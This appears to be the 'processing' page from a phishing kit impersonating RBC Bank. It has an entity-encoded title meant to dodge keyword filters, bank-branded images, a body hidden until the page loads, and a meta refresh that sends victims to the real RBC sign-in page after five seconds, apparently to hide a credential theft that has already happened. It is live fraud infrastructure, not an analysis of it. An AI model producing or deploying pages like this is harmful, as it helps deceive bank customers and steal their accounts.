<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#82;&#66;&#67;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www1.rbcbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=NS&F21=IB&F22=CN&REQUEST=CenturaClientSignin&LANGUAGE=ENGLISH"></html>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:385px; height:133px; z-index:0"><img src="images/bc5.png" alt="" title="" border=0 width=385 height=133></div>

<div id="image2" style="position:absolute; overflow:hidden; left:14px; top:91px; width:324px; height:144px; z-index:1"><img src="images/bc10.png" alt="" title="" border=0 width=324 height=144></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:442px; width:392px; height:186px; z-index:2"><img src="images/bc4.png" alt="" title="" border=0 width=392 height=186></div>

<div id="image4" style="position:absolute; overflow:hidden; left:12px; top:454px; width:309px; height:16px; z-index:3"><a href="#"><img src="images/priv.png" alt="" title="" border=0 width=309 height=16></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:159px; top:277px; width:80px; height:80px; z-index:4"><img src="images/rb.gif" alt="" title="" border=0 width=80 height=80></div>


</body>
</html>
